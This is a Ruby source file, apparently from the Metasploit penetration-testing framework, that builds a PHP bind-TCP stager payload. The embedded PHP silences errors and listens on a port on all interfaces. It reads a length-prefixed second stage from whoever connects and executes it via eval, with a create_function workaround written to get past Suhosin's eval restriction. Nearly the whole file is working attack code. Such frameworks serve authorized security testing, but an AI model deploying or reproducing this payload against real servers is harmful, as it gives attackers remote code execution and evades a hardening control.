
# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/php/send_uuid'

module Msf

###
#
# Complex bind_tcp payload generation for PHP
#
###

module Payload::Php::BindTcp

  include Msf::Payload::Php
  include Msf::Payload::Php::SendUUID

  #
  # Generate the first stage
  #
  def generate
    conf = {
      port: datastore['LPORT']
    }

    php = super + generate_bind_tcp(conf)
    php.gsub!(/#.*$/, '')
    Rex::Text.compress(php)
  end

  #
  # By default, we don't want to send the UUID, but we'll send
  # for certain payloads if requested.
  #
  def include_send_uuid
    false
  end

  def use_ipv6
    false
  end

  def transport_config(opts={})
    transport_config_bind_tcp(opts)
  end

  def generate_bind_tcp(opts={})
    ipf = 'AF_INET'
    ip = '0.0.0.0'
    if use_ipv6
      ipf << "6"
      ip = '[::]'
    end

    php = %Q^/*<?php /**/
error_reporting(0);
$ip = '#{ip}';
$port = #{opts[:port]};

if (is_callable('stream_socket_server')) {
	$srvsock = stream_socket_server("tcp://{$ip}:{$port}");
	if (!$srvsock) { die(); }
	$s = stream_socket_accept($srvsock, -1);
	fclose($srvsock);
	$s_type = 'stream';
} elseif (is_callable('socket_create_listen')) {
	$srvsock = socket_create_listen(#{ipf}, SOCK_STREAM, SOL_TCP);
	if (!$res) { die(); }
	$s = socket_accept($srvsock);
	socket_close($srvsock);
	$s_type = 'socket';
} elseif (is_callable('socket_create')) {
	$srvsock = socket_create(#{ipf}, SOCK_STREAM, SOL_TCP);
	$res = socket_bind($srvsock, $ip, $port);
	if (!$res) { die(); }
	$s = socket_accept($srvsock);
	socket_close($srvsock);
	$s_type = 'socket';
} else {
	die();
}
if (!$s) { die(); }
^

    php << php_send_uuid if include_send_uuid

    php << %Q^switch ($s_type) {
case 'stream': $len = fread($s, 4); break;
case 'socket': $len = socket_read($s, 4); break;
}
if (!$len) {
	# We failed on the main socket.  There's no way to continue, so
	# bail
	die();
}
$a = unpack("Nlen", $len);
$len = $a['len'];

$b = '';
while (strlen($b) < $len) {
	switch ($s_type) {
	case 'stream': $b .= fread($s, $len-strlen($b)); break;
	case 'socket': $b .= socket_read($s, $len-strlen($b)); break;
	}
}

# Set up the socket for the main stage to use.
$GLOBALS['msgsock'] = $s;
$GLOBALS['msgsock_type'] = $s_type;
if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) 
{ 
  $suhosin_bypass=create_function('', $b); 
  $suhosin_bypass(); 
} 
else 
{ 
  eval($b); 
}
die();^
  end

  def handle_intermediate_stage(conn, payload)
    conn.put([payload.length].pack("N"))
  end

end

end

